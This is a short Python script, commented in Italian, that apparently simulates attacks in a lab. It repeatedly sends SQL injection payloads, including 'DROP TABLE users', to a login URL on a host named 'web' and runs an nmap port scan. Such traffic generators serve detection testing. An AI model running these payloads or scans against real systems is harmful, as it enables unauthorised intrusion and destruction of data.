import requests
import nmap
import time

def sql_injection_attempt():
    """
    Simula tentativi di SQL injection
    """
    payloads = [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT * FROM users; --"
    ]
    
    for payload in payloads:
        try:
            url = f"http://web:80/login?username=admin&password={payload}"
            response = requests.get(url)
            print(f"SQL Injection attempt sent. Status: {response.status_code}")
            time.sleep(2)
        except Exception as e:
            print(f"Error: {e}")

def port_scan():
    """
    Esegue una scansione delle porte usando nmap
    """
    nm = nmap.PortScanner()
    nm.scan('web', '80-443')
    print("Port scan completed")

if __name__ == "__main__":
    while True:
        sql_injection_attempt()
        port_scan()
        time.sleep(30)  # Attende 30 secondi tra i cicli di attacco